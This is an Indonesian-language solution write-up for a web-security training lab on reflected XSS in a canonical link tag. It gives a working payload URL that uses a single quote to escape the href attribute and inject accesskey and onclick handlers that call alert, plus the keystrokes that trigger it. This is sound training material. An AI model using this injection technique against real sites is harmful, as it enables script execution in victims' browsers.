# Reflected XSS in canonical link tag

Lab ini menampilkan (merefleksikan) input pengguna di dalam sebuah **canonical link tag**, dan melakukan **escaping pada tanda kurung sudut (< dan >)**.

Untuk menyelesaikan lab ini, lakukan serangan **cross-site scripting (XSS)** pada halaman utama yang menyisipkan sebuah atribut yang memanggil fungsi `alert`.

Untuk membantu eksploitasi, kamu bisa mengasumsikan bahwa pengguna yang disimulasikan akan menekan kombinasi tombol berikut:

```
* ALT + SHIFT + X
* CTRL + ALT + X
* Alt + X
```

Harap diperhatikan bahwa solusi yang dimaksud untuk lab ini hanya bisa dilakukan di **Google Chrome**.


## Solusi

1. Perhatikan di source code ada code seprti ini

```html
<link rel="canonical" href="https://0a5f004104118bcc838a913100b700dc.web-security-academy.net/">
```

2. Dan ketiak buka halaman post akan jadi seprti ini

```html
<link rel="canonical" href="https://0a5f004104118bcc838a913100b700dc.web-security-academy.net/post?postId=2">
```

3. Kita coba masukkan payload berikut

```html
https://0a5f004104118bcc838a913100b700dc.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```


Payload ini menetapkan tombol `X` sebagai *access key* untuk seluruh halaman. Saat user menekan access key tersebut, fungsi `alert()` akan dijalankan.


4. Untuk memicu exploit pada diri sendiri, tekan salah satu kombinasi berikut:

* Windows: `ALT + SHIFT + X`
* MacOS: `CTRL + ALT + X`
* Linux: `Alt + X`
